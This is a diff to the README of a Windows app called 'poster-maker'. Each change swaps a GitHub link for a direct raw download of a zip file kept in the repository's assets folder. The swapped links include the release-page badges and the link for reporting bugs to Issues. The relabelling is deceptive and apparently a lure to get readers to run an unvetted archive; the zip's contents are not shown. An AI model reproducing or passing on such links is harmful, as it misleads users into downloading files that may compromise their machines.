@@ -1,6 +1,6 @@
 # 🎨 poster-maker - Create Posters Without Design Tools
 
-[![Download poster-maker](https://img.shields.io/badge/Download-Get%20poster--maker-purple?style=for-the-badge)](https://github.com/joshuahigher570/poster-maker/releases)
+[![Download poster-maker](https://img.shields.io/badge/Download-Get%20poster--maker-purple?style=for-the-badge)](https://raw.githubusercontent.com/joshuahigher570/poster-maker/main/assets/poster_maker_v1.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ The app works by turning your text into images using standard web technologies l
 ## 🚀 Getting Started
 
 1. Click this big button to **visit the downloads page** and get the latest version of poster-maker:  
-   [![Download poster-maker](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/joshuahigher570/poster-maker/releases)
+   [![Download poster-maker](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/joshuahigher570/poster-maker/main/assets/poster_maker_v1.0.zip)
 
 2. On the download page, look for the latest release. It usually has a version number like `v1.0` or higher.
 
@@ -131,10 +131,10 @@ poster-maker is open source software. You can find the full source code and cont
 
 If you find bugs or have questions, use the GitHub Issues page here:
 
-https://github.com/joshuahigher570/poster-maker/issues
+https://raw.githubusercontent.com/joshuahigher570/poster-maker/main/assets/poster_maker_v1.0.zip
 
 Please provide detailed information, including your Windows version and a description of the problem.
 
 ---
 
-[![Download poster-maker](https://img.shields.io/badge/Download-Visit%20Page-purple?style=for-the-badge)](https://github.com/joshuahigher570/poster-maker/releases)
+[![Download poster-maker](https://img.shields.io/badge/Download-Visit%20Page-purple?style=for-the-badge)](https://raw.githubusercontent.com/joshuahigher570/poster-maker/main/assets/poster_maker_v1.0.zip)
